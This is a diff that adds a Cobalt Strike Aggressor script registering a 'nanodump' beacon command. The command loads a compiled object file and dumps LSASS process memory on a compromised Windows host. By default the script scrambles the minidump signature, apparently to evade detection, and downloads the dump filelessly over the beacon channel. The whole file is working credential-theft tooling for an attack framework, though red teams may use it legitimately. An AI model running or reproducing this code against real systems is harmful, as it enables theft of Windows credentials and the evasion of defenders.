@@ -1,0 +1,101 @@
+
+sub get_invalid_sig {
+local('@dictionary', '$signature');
+    @dictionary = @("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+    $signature = "PMDM";
+    while ($signature eq "PMDM")
+    {
+        $signature = rand(@dictionary) . rand(@dictionary) . rand(@dictionary) . rand(@dictionary);
+    }
+    return $signature;
+}
+
+beacon_command_register(
+"nanodump",
+"Use syscalls to dump LSASS.",
+"Usage: nanodump [--pid 1234] [--valid] [--write C:\\Windows\\Temp\\doc.docx]");
+alias nanodump {
+    local('$barch $handle $data $args $pid $cname $dump_name $write_file $signature $i');
+
+    $barch = barch($1);
+    if($barch eq "x86")
+    {
+        berror($1, "Nanodump does not support x86");
+        return;
+    }
+
+    ## make sure the beacon is not WoW64
+    #$barch = barch($1);
+    #$is64 = binfo($1, "is64");
+    #if($barch eq "x86" && $is64 == 1)
+    #{
+    #    berror($1, "Nanodump does not support WoW64");
+    #    return;
+    #}
+
+    # reading lsass requires elevated privileges
+    if(!-isadmin $1)
+    {
+        berror($1, "You need to be admin to run nanodump.");
+        return;
+    }
+
+    # read in the BOF file
+    $handle = openf(script_resource("compiled/nanodump." . $barch . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    if(strlen($data) == 0)
+    {
+        berror($1, "could not read bof file");
+        return;
+    }
+
+    # by default, nanodump will find the PID of LSASS dinamically
+    $pid = 0;
+    # name of the dump when downloaded fileless
+    $cname = beacon_info($1, "computer");
+    $time = int(ticks() / 1000);
+    $dump_name = $cname . "_" . $time . "_lsass.dmp";
+    # by default, download the minidump fileless
+    $write_file = 0;
+    # by default, the signature of the minidump is invalid
+    $signature = get_invalid_sig();
+    for ($i = 1; $i < size(@_); $i++)
+    {
+        if (@_[$i] eq "--pid" || @_[$i] eq "-p")
+        {
+            # set the PID of LSASS
+            $i++;
+            $pid = @_[$i];
+        }
+        else if (@_[$i] eq "--write" || @_[$i] eq "-w")
+        {
+            # set the path where the minidump will be written to disk
+            $write_file = 1;
+            $i++;
+            $dump_name = @_[$i];
+        }
+        else if (@_[$i] eq "--valid" || @_[$i] eq "-v")
+        {
+            # use a valid signature for the minidump
+            $signature = "PMDM";
+        }
+        else if (@_[$i] eq "--help" || @_[$i] eq "-h")
+        {
+            berror($1, beacon_command_detail("nanodump"));
+            return;
+        }
+        else
+        {
+            berror($1, "invalid argument: " . @_[$i]);
+            return;
+        }
+    }
+
+    # pack the arguments
+    $args = bof_pack($1, "iziz", $pid, $dump_name, $write_file, $signature);
+
+    # run
+    btask($1, "Running NanoDump");
+    beacon_inline_execute($1, $data, "go", $args);
+}
